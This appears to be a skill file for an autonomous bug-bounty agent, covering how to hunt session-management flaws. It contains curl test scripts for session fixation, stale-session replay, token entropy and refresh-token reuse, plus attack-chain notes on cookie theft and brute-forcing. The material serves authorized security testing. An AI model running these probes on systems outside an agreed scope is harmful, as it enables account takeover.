# Upstream source: session (hunting)

Original path: `/tmp/h1res_MrPsycho04_Hunting-Agent/session/SKILL.md`

---

---
name: session
description: >-
  Hunt Session Management vulnerabilities — session fixation (no regeneration on login), insufficient
  invalidation on logout / password-change / email-change, predictable or low-entropy session IDs, JWT-as-
  session with no exp/revocation, refresh-token rotation/reuse-detection gaps, OAuth/SSO session linkage,
  device-bound-session (DBSC) downgrade, and cookie attribute issues (Secure/HttpOnly/SameSite/__Host-).
  Validate with TWO real sessions (attacker A + victim B), body-diff every 200, and OOB confirmation for
  theft chains. Medium to Critical (fixation→admin hijack, no-invalidation→persistent ATO). Combined with
  the HackerOne field guide (real disclosed-report data: where it pays, quick wins, payload banks). Hunt
  session flaws. Use when testing cookies, tokens, logout, fixation, and concurrent sessions. Backed by 150
  disclosed HackerOne reports.
---

# Session — Combined Field Guide

**Merged skill.** This fuses two complementary sources into one reference:

- **Part 1 — HackerOne field guide:** statistics from disclosed reports, "where it pays," quick wins, and curated payload banks.
- **Part 2 — Bug hunter methodology:** autonomous testing priority, canary discipline, crown-jewel targeting, OOB/validation gates, and reporting guidance.

**How to use:** Open with Part 2 for execution discipline (set your canary, know your success/failure gate). Use Part 1 to prioritize targets and pull payloads. Before reporting, run the validation gates in both parts.

---

<!-- ============ PART 1: HACKERONE FIELD GUIDE (data + payloads) ============ -->

# Session Management — HackerOne field guide

Built from **150** publicly disclosed HackerOne reports (2014–2026). Corpus: `~/.local/share/hackerone-reports/`.

**Reference files (load on demand):**

- `references/payloads.md` — payload banks, probes, wordlists, Nuclei templates, observed parameters
- `references/techniques.md` — quick wins, bypasses, real-report techniques, deeper checklists

## Signal

- Reports: **150** · paid: **22**
- Median bounty **$100** · p90 **$540** · max **$1,600** · total **$6,140**
- Median upvotes **11**

## Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| Shopify | 8 | $2,100 | 553 |
| HackerOne | 13 | $1,000 | 293 |
| WePay | 2 | $600 | 6 |
| X / xAI | 1 | $560 | 19 |
| Internet Bug Bounty | 4 | $540 | 123 |
| Open-Xchange | 1 | $300 | 11 |
| VK.com | 1 | $300 | 10 |
| Visma Public | 2 | $200 | 23 |

## Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`cookie` `session` `token` `jwt` `remember` `logout`

## Tools

`Burp` · `jwt_tool` · `browser devtools`

## Escalation chains

- Session fixation -> ATO.
- Token leak -> session hijack.

## Related

- `auth-bypass` (989 reports)
- `csrf` (541 reports)
- `mfa-and-passwords` (285 reports)

## Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

## Autonomous Testing Priority

**Missing HttpOnly on cookies is auto-detected — focus your active testing on lifecycle invalidation (higher impact).**

**Pattern 1 — Session survives logout (most common high-value finding):**
1. Login and note the session token/cookie value
2. Call the logout endpoint (`/logout`, `POST /api/logout`, etc.)
3. Try to use the OLD session token to access a protected resource (`/api/me`, `/dashboard`, `/account`)
4. If 200 with user data → session not invalidated on logout = ATO persistence

**Pattern 2 — Session not regenerated on login (session fixation):**
1. GET any page to receive a pre-authentication session token/cookie
2. POST valid credentials to the login endpoint
3. Compare the session token BEFORE and AFTER login
4. If the token is unchanged → session fixation vulnerability

**Pattern 3 — Session survives password change:**
1. Login → record session A value
2. Change the password via the account settings endpoint
3. Replay session A on a protected endpoint
4. If 200 → token not rotated on credential change = persistent ATO (critical chain when combined with XSS/cookie theft)

**Content-type:** Login and session endpoints vary — use `application/json` for REST APIs, `application/x-www-form-urlencoded` for traditional web forms. Try both if the first returns an unexpected response.

**Proof:** A protected-resource 200 response (with user data) using a session token that should have been invalidated confirms the finding.

---

# HUNT-SESSION — Session Management

## Crown Jewel Targets

Session fixation leading to admin hijack = Critical. Session surviving a password change = High-to-Critical (persistent ATO from a stolen cookie that the victim believes they revoked by resetting their password).

**Highest-value chains:**
- **Session fixation** — server accepts a session ID set by the client and does NOT regenerate it on login → attacker pre-plants an ID, victim authenticates, attacker rides the now-authenticated session → persistent ATO.
- **No invalidation on logout** — old token still works after `/logout` → theft window never closes.
- **No invalidation on password / email change** — a stolen session survives the victim's "I think I was hacked, let me reset" → persistent ATO. This is the single highest-paid session bug class.
- **Refresh-token reuse without rotation-detection** — a leaked refresh token mints fresh access tokens forever; no reuse-detection means the legitimate user's later refresh does NOT revoke the attacker's branch.
- **Predictable / low-entropy session ID** — sequential, timestamp- or userId-derived IDs → brute-force or compute other users' sessions.
- **JWT-as-session with no `exp` / no revocation list** — stolen JWT = permanent access; logout is cosmetic.

---

## Grounding — patterns that shaped each phase

No invented CVE/report IDs below. These are the *named, publicly-documented* patterns this skill encodes:

- **Session fixation, login-CSRF, no-regeneration-on-auth** — OWASP WSTG-SESS-03 / WSTG-SESS-01; the classic ACROS / Mitja Kolšek session-fixation paper. Highest-impact variant: fixing the session of an SSO/admin user.
- **SameSite=Lax sibling-subdomain CSRF reaching session state** — Argo CD **CVE-2024-22424** (Lax cookies sent on top-level cross-site navigations from a sibling subdomain). Use this when a session cookie relies on `SameSite=Lax` as its only CSRF defence.
- **Refresh-token rotation & automatic reuse-detection** — the Auth0/IETF OAuth-Security-BCP model: a rotated refresh token, if replayed, must invalidate the *entire token family*. Absence = the core bug to prove.
- **Device Bound Session Credentials (DBSC)** — the W3C/Chrome DBSC draft binds a session to a TPM/device key. Test the *downgrade*: does the server still accept a non-bound cookie when the DBSC challenge is stripped?
- **Cookie attribute hardening** — OWASP WSTG-SESS-02; `__Host-`/`__Secure-` prefixes per RFC 6265bis. Missing `HttpOnly` is only a finding when a real XSS/DOM sink exists (chain with `xss`/`dom`).
- **Entropy** — NIST SP 800-63B requires ≥64 bits of entropy in a session identifier. Treat anything decodable to a counter/timestamp/userId as a finding regardless of length.

Cross-refs: ATO chaining → `account-takeover`; JWT alg/kid tampering → `api-misconfig`; OAuth code/state flaws → `oauth-oidc`; CSRF mechanics → `csrf`; cookie-theft sinks → `xss` / `dom`.

---

## Attack Surface Signals

```
Set-Cookie: session=...            # name varies: sid, JSESSIONID, connect.sid,
                                   # PHPSESSID, ASP.NET_SessionId, laravel_session, _csrf
/login /logout /api/login /oauth/token
/auth/refresh /api/token/refresh   # refresh-token rotation surface
/account/change-password /settings/email
?sid= ?session= in URL             # session-in-URL → leaks via Referer/logs (finding)
```
```
# Header signals worth flagging immediately:
Set-Cookie: session=abc; Path=/                 # no HttpOnly/Secure/SameSite
Set-Cookie: session=abc; SameSite=None          # None without Secure = rejected by modern browsers, but flag
Set-Cookie: __Host-sess=...; Secure; Path=/     # GOOD — hard to fixate
Sec-Session-Registration: ...                   # DBSC in play → test downgrade
```

---

## Step-by-Step Hunting Methodology

> **Two-session rule.** Every invalidation/fixation claim is proven with TWO concrete sessions captured by a real flow — attacker **A** and victim **B** — never with hardcoded placeholder strings. Helpers below capture real cookies from `curl`'s Netscape jar.

```bash
TARGET=target.com
JAR_A=$(mktemp); JAR_B=$(mktemp)

# Robust session-cookie extractor: handles #HttpOnly_ prefix lines and any
# cookie name (sid/JSESSIONID/connect.sid/PHPSESSID/...). Prints name=value.
get_cookie () {  # $1=jar  $2=name-regex (default: common session names)
  local jar="$1" re="${2:-session|sid|sess|JSESSIONID|connect\.sid|PHPSESSID|laravel_session}"
  awk -v re="$re" '
    /^#HttpOnly_/ { sub(/^#HttpOnly_/,""); }   # strip jar HttpOnly marker
    /^#/ { next }                              # skip remaining comments
    NF>=7 && $6 ~ re { print $6"="$7 }         # field6=name field7=value
  ' "$jar" | tail -1
}
```

### Phase 1 — Session Fixation (regeneration-on-login)
```bash
# Step 1: grab a pre-auth session the SERVER hands an anonymous client.
curl -s -L -c "$JAR_A" "https://$TARGET/login" -o /dev/null
PRE=$(get_cookie "$JAR_A"); echo "pre-auth: $PRE"

# Step 1b (stronger): can we FORCE an arbitrary ID? attacker-chosen value.
FIX="session=AAAAdeadbeefAAAA"

# Step 2: authenticate while CARRYING the pre-auth/forced cookie (reuse same jar).
curl -s -L -c "$JAR_A" -b "$JAR_A" -X POST "https://$TARGET/login" \
  -d "username=attacker@example.com&password=CorrectHorse1" -o /dev/null
POST=$(get_cookie "$JAR_A"); echo "post-auth: $POST"

# DECISION:
#  - If $POST == $PRE (value unchanged across the auth boundary) AND that value
#    now returns authenticated data → FIXATION. The server reused the anon ID.
#  - If the forced $FIX value is accepted and authenticates → CRITICAL fixation
#    (attacker controls the ID; no email/XSS needed to plant it).
AUTH=$(curl -s -L -b "$JAR_A" "https://$TARGET/api/me")
echo "$AUTH" | head -c 200
```
**FP guard:** a value *change* is not automatically safe — some apps rotate the readable cookie but keep a stable server-side session keyed by a second cookie. Diff the FULL `Set-Cookie` set and confirm the *old* value is genuinely dead (Phase 2). Also confirm `/api/me` returns *your* identity, not a generic 200/landing page.

### Phase 2 — Invalidation on Logout
```bash
# A logs in for real (fresh jar), capture A's live session.
curl -s -L -c "$JAR_A" -X POST "https://$TARGET/api/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"attacker@example.com","password":"CorrectHorse1"}' -o /dev/null
A=$(get_cookie "$JAR_A"); echo "A=$A"

# Baseline: what does an authenticated /api/me look like for A? (capture body, not just code)
BEFORE=$(curl -s -L -b "$JAR_A" "https://$TARGET/api/me")

# Logout A.
curl -s -L -b "$JAR_A" -X POST "https://$TARGET/api/logout" -o /dev/null

# Replay A's OLD cookie value explicitly (do NOT reuse the jar — logout may have
# overwritten it). Compare body + code against the authenticated baseline.
AFTER=$(curl -s -L -H "Cookie: $A" "https://$TARGET/api/me" -w '\n[%{http_code}]')
echo "AFTER: $AFTER"
```
**FP discipline (mandatory):**
- Don't trust the status code. A cached/edge 200 or a generic SPA shell returns 200 for everyone. **Body-diff** `AFTER` against `BEFORE` — the finding is only real if `AFTER` still contains A's *unique identity marker* (email, user-id, CSRF token, account name).
- Confirm with a **negative control**: a random/garbage cookie value must NOT return the same authenticated body. If garbage also yields 200 with user data, the endpoint isn't session-gated and there's no finding here.
- Re-test after a **short delay** and from a **different IP** — some servers lazily expire on next access or pin sessions to IP.

### Phase 3 — Invalidation on Password / Email Change (persistent-ATO core)
```bash
# This is the real two-session flow. A = attacker holding a stolen/old session.
# B = the victim who changes their password believing it revokes access.
# (In a real engagement A is a session you legitimately captured for a TEST account
#  that you also control as B — never use a real third party.)

# 1) Log the TEST account in as session A, capture it.
curl -s -L -c "$JAR_A" -X POST "https://$TARGET/api/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"victim@example.com","password":"OldPass!1"}' -o /dev/null
SESSION_A=$(get_cookie "$JAR_A"); echo "SESSION_A=$SESSION_A"
BEFORE=$(curl -s -L -H "Cookie: $SESSION_A" "https://$TARGET/api/profile")

# 2) Log the SAME account in as session B (separate jar = "the victim's browser").
curl -s -L -c "$JAR_B" -X POST "https://$TARGET/api/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"victim@example.com","password":"OldPass!1"}' -o /dev/null

# 3) Victim (session B) changes the password.
curl -s -L -b "$JAR_B" -X POST "https://$TARGET/api/change-password" \
  -H 'Content-Type: application/json' \
  -d '{"old_password":"OldPass!1","new_password":"BrandNew!2"}' -o /dev/null

# 4) THE TEST: replay the OLD SESSION_A captured in step 1.
AFTER=$(curl -s -L -H "Cookie: $SESSION_A" "https://$TARGET/api/profile" -w '\n[%{http_code}]')
echo "AFTER pw-change: $AFTER"
```
**Decision + FP discipline:**
- Finding is confirmed only if `AFTER` returns 200 **and** the body still carries the account's unique data (body-diff vs `BEFORE`). A bare 200 on a public/SPA route is not proof.
- Run the **garbage-cookie negative control** again to prove the endpoint is session-gated.
- Repeat the identical flow for **email-change** (`/settings/email`) and for **logout-all-devices** — apps frequently invalidate the *acting* session (B) but not *sibling* sessions (A). That sibling-survival is the exact persistent-ATO primitive `account-takeover` chains.
- **Severity gate:** if the change-password endpoint also lacks a current-password / MFA step-up (per `mfa-and-passwords`), A can pivot from read-only to full takeover → escalate.

### Phase 4 — Cookie Attribute Analysis
```bash
curl -sI -L "https://$TARGET/" | grep -i '^set-cookie'
```
- **HttpOnly** missing → cookie reachable via `document.cookie`. Only a finding **chained to a real XSS/DOM sink** (`xss`/`dom`) — note it, don't report standalone as High.
- **Secure** missing → cookie sent over cleartext HTTP; pair with `tls-network` (downgrade/HSTS-gap) for a network-attacker chain.
- **SameSite** missing/`None` → CSRF reachability; `SameSite=Lax` is bypassable via sibling-subdomain top-level navigation (Argo CD **CVE-2024-22424** class) → hand to `csrf`.
- **`__Host-` / `__Secure-` prefix absent** → the session can be overwritten/fixated from a subdomain or non-secure context; its presence largely kills cookie-fixation, so flag the *absence* as the precondition for Phase 1.

### Phase 5 — Session-ID Entropy
```bash
# Collect a LARGE sample (200+) of freshly-issued IDs. -L is required: a 302
# /login often sets the cookie on the redirect target, not the first response.
N=200; SAMP=$(mktemp)
for i in $(seq 1 $N); do
  J=$(mktemp)
  curl -s -L -c "$J" "https://$TARGET/login" -o /dev/null
  get_cookie "$J" | cut -d= -f2- >> "$SAMP"
  rm -f "$J"
done
sort "$SAMP" | uniq -d | head            # duplicates = catastrophic (re-use)
awk '{print length($0)}' "$SAMP" | sort -n | uniq -c   # length distribution
```
Then analyse, don't eyeball:
- **Sequential / monotonic** — `sort -n` the decoded values; a steady +1/+N delta = predictable.
- **Decodable structure** — `base64 -d` / hex-decode each ID and look for embedded `userId`, unix timestamps, or PIDs.
- **Bit entropy** — feed the raw bytes to `ent` or `dieharder`; NIST SP 800-63B wants ≥64 bits. 10 samples is far too few to claim anything — gather hundreds.
- **FP guard:** a long random-*looking* token is not proof of strength; only structural decode + a large-sample entropy estimate is. Conversely a short token with high per-char entropy may still be fine — measure, don't count characters.

### Phase 6 — JWT-as-Session
```bash
JWT="eyJ..."        # captured from Authorization: Bearer or a cookie
# Decode header + payload safely (base64url padding fix).
b64url(){ local s="${1//-/+}"; s="${s//_//}"; printf '%s' "$s===" | base64 -d 2>/dev/null; }
b64url "$(cut -d. -f1 <<<"$JWT")" | jq .   # header: alg, kid
b64url "$(cut -d. -f2 <<<"$JWT")" | jq .   # claims: exp, iat, sub, jti
```
- **`exp` missing or years out** → no expiry. **`jti` missing** → server cannot maintain a revocation list → logout can't truly revoke.
- **Revocation test:** logout, then replay the *same* JWT against `/api/me`. If it still returns the user → tokens are not server-revocable; this is the JWT-session persistence finding. Body-diff to avoid a cached 200.
- **Tampering (alg/kid/key-confusion) is owned by `api-misconfig`** — hand off `jwt_tool $JWT -T` / `-X a` there rather than duplicating it.

### Phase 7 — Refresh-Token Rotation & Reuse-Detection
```bash
# 1) Obtain a refresh token (login or /oauth/token), then rotate it once.
RT1=$(curl -s -L -X POST "https://$TARGET/api/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"victim@example.com","password":"OldPass!1"}' | jq -r '.refresh_token')

# 2) Use RT1 to mint a new access token — server SHOULD return a rotated RT2.
R2=$(curl -s -L -X POST "https://$TARGET/auth/refresh" \
  -H 'Content-Type: application/json' -d "{\"refresh_token\":\"$RT1\"}")
RT2=$(jq -r '.refresh_token' <<<"$R2"); echo "rotated? RT1!=RT2 -> $([ "$RT1" != "$RT2" ] && echo yes || echo NO-ROTATION)"

# 3) REUSE-DETECTION test: replay the OLD RT1 again (simulating the leaked token).
REPLAY=$(curl -s -L -X POST "https://$TARGET/auth/refresh" \
  -H 'Content-Type: application/json' -d "{\"refresh_token\":\"$RT1\"}" -w '\n[%{http_code}]')
echo "RT1 replay: $REPLAY"

# 4) Then confirm RT2 was KILLED by the replay (correct BCP behaviour invalidates
#    the whole family). If RT2 still works after RT1 was replayed → no family-revocation.
curl -s -L -X POST "https://$TARGET/auth/refresh" \
  -H 'Content-Type: application/json' -d "{\"refresh_token\":\"$RT2\"}" -w '\n[%{http_code}]'
```
**Findings:** no rotation (RT1==RT2) = a long-lived stealable credential; rotation **without** reuse-detection (RT1 replay still mints tokens, or RT2 survives the replay) = the leaked-token-persistence bug per the OAuth Security BCP. **OOB note:** if you suspect a leaked RT via SSRF/log/JS-bundle, confirm the token's reach with `ssrf`/`info-disclosure`, not by guessing.

### Phase 8 — OAuth/SSO Session Linkage & DBSC Downgrade
```bash
# SSO linkage: after IdP callback, is the app session bound to the IdP session?
#  - Log out at the IdP only; replay the app session cookie. Still 200 with user
#    data → app session outlives the IdP session (single-logout gap).
# DBSC downgrade: if responses carry Sec-Session-Registration / Sec-Session-Id,
#  strip the device-bound proof header and replay the plain cookie:
curl -s -L -H "Cookie: $A" "https://$TARGET/api/me" -w '\n[%{http_code}]'
#  If the plain (non-bound) cookie is still accepted → device-binding is advisory,
#  not enforced → a stolen cookie defeats DBSC entirely.
```
Hand OAuth `state`/`redirect_uri`/code-injection to `oauth-oidc`; this phase only covers the *session-layer* binding.

---

## Chain Table

| Session finding | Chain to | Impact |
|----------------|----------|--------|
| Session fixation (forced `__Host-`-less cookie) | Trick admin/SSO user into authenticating on planted ID | Admin session takeover (Critical) |
| No logout/password-change invalidation | `xss`/`dom` cookie theft → replay surviving session | Persistent ATO past victim's reset |
| Refresh token, no reuse-detection | Leaked RT (SSRF/log/bundle) → infinite access-token minting | Persistent ATO, survives password change |
| `SameSite=Lax` only | Sibling-subdomain top-level nav (CVE-2024-22424 class) → CSRF | State change / login-CSRF → fixation |
| JWT no `exp`/`jti` | Stolen token, no server revocation | Permanent access |
| DBSC downgrade accepted | Steal plain cookie despite device-binding | Defeats the only theft mitigation |
| Predictable ID | Compute/brute another user's session | Cross-user ATO |

---

## Validation (house FP discipline)

Before claiming ANY session finding:
- **Two real sessions, not placeholders** — every fixation/invalidation claim uses A and B captured by the `curl` flows above.
- **Body-diff, never status-only** — a 200 means nothing without the account's unique identity marker present in the body, diffed against the authenticated baseline.
- **Negative control** — a garbage/random cookie must FAIL where your "surviving" cookie succeeds; otherwise the endpoint isn't session-gated and it's a non-finding.
- **Cache/edge check** — re-request with a cache-buster and from a second IP; rule out an edge-cached or IP-pinned 200.
- **OOB for theft chains** — when the impact depends on exfiltrating a cookie/token (XSS, SSRF, log leak), confirm receipt out-of-band (Collaborator) rather than asserting it.
- **Static-vs-state** — `HttpOnly`/`Secure`/`SameSite` absence is a *policy* observation; only report as High once paired with a real exploit primitive (XSS, network-MITM, CSRF). Standalone attribute gaps are Low/Informational.

**Severity:**
- Session fixation → admin/SSO takeover: **Critical**
- No invalidation on password/email change, or refresh-token reuse without detection: **High → Critical** (escalate if MFA/step-up also absent)
- Predictable/duplicate session ID: **High**
- No invalidation on logout: **Medium → High** (depends on theft vector)
- Missing `HttpOnly`/`SameSite` standalone: **Low/Informational** until chained

## Web-Research Methodology Additions (2026)

### A. Discovery checklist — concrete places, params, headers, flows to look

- Inventory every session-bearing artifact: auth cookie(s), `remember-me`/persistent cookie, refresh token, JWT access token, SSO session cookie, password-reset token, CSRF token, and any opaque session ID in a URL (`?sid=`, `?session=`, path segments). PortSwigger classifies session-in-URL as CWE-598/CWE-384 and notes leakage via browser history, logs, and `Referer`.
- Record cookie attributes for each: `Secure`, `HttpOnly`, `SameSite`, `Domain`, `Path`, `Expires`/`Max-Age`, `__Host-`/`__Secure-` prefixes. Multiple cookies with the same name but different `Path` (Snyk 2026 OAuth case) create a path-scope confusion primitive.
- Determine regeneration points: compare the session token before login, after login, after privilege change, after password change, and after email change. Logout must invalidate server-side state, not just clear the browser cookie.
- Test refresh-token flows from SPAs/mobile apps: collect the full `POST /oauth/token` with `grant_type=refresh_token` and watch whether each exchange returns a *new* refresh token (rotation) and whether old ones are revoked.
- Use Burp Sequencer on a large sample of session tokens (PortSwigger/Burp testing workflow: "Analyzing session token generation") to check entropy; decode opaque tokens (Base64/JSON) for timestamp+username construction.
- Look for session-handling rules that auto-re-login during fuzzing (Burp "Maintaining an authenticated session") — a token that stays valid after the app tries to log you out is a signal.
- Enumerate sibling subdomains and cloud/CDN assets: a subdomain takeover can yield a cookie scoped to `.domain.com` (Uber/Roblox/Ubiquiti pattern), and dangling DNS plus a broad cookie scope is a session-theft primitive.

- Compare the token issued at login with the one issued after a privilege change (role promotion, admin impersonation, assuming a sub-account). A token whose claims/subject do not change may retain stale privileges.
- Check whether logout is client-only: clear the cookie in the browser but replay the original `Cookie` header in Repeater. Still-valid server state = improper invalidation even if the UI logs out.
- Look for parallel sessions: if logging in on device B does not invalidate device A, a stolen cookie has a long useful lifetime; record how many concurrent sessions are allowed and whether a "log out all devices" control exists.
- Test password/email change with a stale session: the old session should be killed; if it survives, the change did not revoke the attacker's access (a common ATO persistence primitive).
- Inspect `Set-Cookie` for `__Host-`/`__Secure-` prefixes and `Domain` scoping; a session cookie scoped to `.example.com` is exposed to every sibling subdomain, including any that can be taken over.
- Check SSO session linkage: an IdP session that remains valid after the app-side logout can silently re-authenticate the user on the next `/sso/callback` — test by replaying a fresh authorization code after logout.
- Note session timeout semantics: absolute vs idle timeout, and whether the server enforces it (a cookie with `Expires` in the future but a short server-side TTL is fine; a long server TTL with short browser expiry is a weaker but not always reportable issue).
- Look for session IDs in logs, error messages, `Referer`, and browser history (PortSwigger CWE-598) — these are theft vectors that make an otherwise strong token exploitable.
- Check whether the app accepts a session token in multiple locations (cookie, header, query, body) — a token accepted via `?sid=` can be planted or leaked through a URL.

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- Session fixation: set a known `PHPSESSID`/`JSESSIONID` in the victim (via URL param, hidden form field, or subdomain cookie injection), let them authenticate, then reuse the pre-set ID. Failure to regenerate on login = CWE-384.
- No invalidation: replay the old cookie after logout, after password change, and after email change; a persistent ATO results if the server accepts it. HackerOne reports #3101207 (auto sign-in without credentials after logout) and #3120790 (captured login response replay) are public precedents.
- Predictable token: decode your own cookie, deduce the formula (e.g. `base64(user|timestamp)` or unsalted `md5(password)`), then brute-force another user's cookie offline — bypassing login rate limits because cookie guesses hit a different endpoint.
- Refresh-token abuse (HackTricks + Auth0 2025 detection catalog): redeem RT1 → get RT2; redeem RT1 again (must fail); redeem RT2 (with proper reuse detection it must also fail because the whole token family is revoked). If RT2 still works, there is no rotation-based replay detection. Also check unused RTs after logout/password change/app revocation.
- Sender-constrained token downgrade: take a DPoP-bound token and send `Authorization: Bearer <TOKEN>` with no `DPoP` header, replay an old `iat` proof, reuse a proof with the wrong `htm`/`htu`, or sign with a key not matching `cnf.jkt`. For mTLS tokens, call the API with no client certificate.
- Path-scope cookie confusion: if the app sets `_access_cookie` for `/` and for sensitive subpaths, an attacker can plant a cookie at a broader path so the victim's browser sends the attacker's token to critical endpoints while using their own elsewhere.
- Token-in-URL/Referer chain: place the session ID in a GET URL, then induce a navigation to a third party so the `Referer` leaks it; combine with open redirect/analytics for collection.
- Race the refresh or reset state with HTTP/2 single-packet requests (PortSwigger Turbo Intruder `engine=Engine.BURP2`, `concurrentConnections=1`, `gate='1'` / `openGate('1')`).

- Cookie tossing / subdomain injection: if a sibling subdomain is takeover-able or has a cookie-writing XSS, set `Domain=.example.com` for the app's session cookie name and try to pin a known session ID (session fixation via cookie shadowing).
- JWT-as-session without revocation: capture a valid JWT, log out, then replay it; if accepted, there is no server-side revocation list or token version check.
- Session-puzzle/CSRF-token reuse: if the CSRF token is derived from the session ID or is static, combine with fixation to force a state-changing action in the victim's session.
- Idle-timeout bypass: keep the session alive by sending harmless background requests (e.g. `/api/heartbeat`) that an attacker can trigger from a victim's browser via `img` tags, extending an otherwise short window.
- Parallel-request locking bypass: if PHP's session handler serializes requests, send each attack request with a *different* valid session token (or `?PHPSESSID=` variant) so the lock does not serialize them — PortSwigger's race-condition guidance on session-based locking.
- Refresh-token race: fire two parallel `grant_type=refresh_token` requests with the same RT. Depending on rotation logic, both may succeed or one may revoke the other — record which, as this is both a test and a detection signal.
- Device-bound session downgrade: if the app advertises DBSC/DPoP/mTLS, replay the token without the binding proof on every API host and version, since enforcement lives at each resource server.
- XSS → session theft chain: with an XSS primitive, check whether the session cookie is HttpOnly; if not, exfiltrate it via `document.cookie` to a Collaborator and replay from your browser to prove account access.
- Remember-me cookie brute: collect your own persistent cookie across several logins with different timestamps, derive the formula, then brute another user's — this bypasses login throttles because it hits a different validation path.

### C. Validation / proof bar — how to confirm and avoid false positives

- Use TWO real sessions (attacker A + victim B). Body-diff every 200 response; show a live authenticated action as B from A's starting position, not merely an accepted cookie.
- For theft chains, require out-of-band confirmation (Collaborator hit with the token) or a demonstrated login as the victim; a leaked cookie that is HttpOnly/secure-scoped and never delivered anywhere is not a finding.
- Rotation/reuse: honor documented grace periods — an overlap window is legitimate (Auth0 false-positive note). Only claim missing reuse detection after RT2 works *outside* any grace window; confirm family revocation by testing both tokens.
- Fixation requires showing the victim actually authenticates on the attacker-chosen ID; a cookie you set but the server ignores is not fixation.
- Cookie-attribute-only findings (missing `HttpOnly`/`SameSite` with no theft vector) are Low/Informational until chained.
- Redact session cookies and other-user PII in the PoC; preserve raw Set-Cookie headers in evidence but mask values.

- Prove fixation with a full walkthrough: seed the token, have the victim log in, then use the token from a browser that never saw their credentials. Showing that the token is merely accepted post-login is not enough.
- For "no invalidation" findings, replay at three points — logout, password change, and email change — and note each result; a control that works at only one point is still a finding but the impact differs.
- Verify the stale token still accesses *sensitive* data, not just a static page; session handling often serves cached public content even after logout.
- When reporting refresh-token reuse detection failures, show RT1 failed on second use AND RT2 still worked, then re-check after a short interval to exclude an intentional grace window.
- For token-in-URL, require an actual third-party Referer or log entry containing the token — "it was in the URL" alone is a best-practice observation, not a demonstrated leak.
- Sequencer results need enough samples and a valid token format; a "weak" score on a token with a large random component can be a tooling artifact — confirm with manual inspection/decode.
- Distinguish a stolen session from a legitimately shared one: use two accounts you control and show the attacker never possessed the victim's password or OTP.
- Re-test all findings in a clean browser profile to eliminate cached cookies, service-worker state, and HSTS/cookie-jar artifacts from the proof.
- Redact all session cookie values, JWTs, and other-user PII in screenshots; keep only the cookie name and enough prefix to identify the token.

### D. Sources — numbered list of URLs you actually fetched

1. https://portswigger.net/burp/documentation/desktop/testing-workflow/vulnerabilities/session-management
2. https://auth0.com/blog/refresh-token-security-detecting-hijacking-and-misuse-with-auth0
3. https://hacktricks.wiki/en/pentesting-web/oauth-to-account-takeover.html
4. https://portswigger.net/web-security/race-conditions
